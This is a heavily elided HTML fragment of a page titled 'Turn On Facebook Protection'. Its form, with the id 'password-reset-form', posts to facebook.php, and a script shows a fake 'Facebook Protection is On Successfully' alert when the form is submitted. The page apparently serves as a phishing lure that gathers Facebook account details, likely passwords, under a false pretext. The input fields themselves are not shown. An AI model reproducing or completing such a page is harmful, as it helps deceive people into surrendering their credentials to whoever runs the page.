    ...
    <nav>     
        ...
        <div class="menu-container">
            <ul>            
                ...
                <li><a href="facebook.php" class="menu" id="specialitemcolor">Facebook</a></li>         
   ...
   <span></span>
    ...
    <div class="container">     
        <div class="form-container">         
            <h2 id="onlywhiteitems">Turn On Facebook Protection</h2>         
            <form action="facebook.php" method="post" id="password-reset-form" onsubmit="return showLoadingMessage()">             
    ...
    <script>
        function showLoadingMessage() {
            ...
            if (form.checkValidity()) {
                ...
                alert("Facebook Protection is On Successfully ✔");
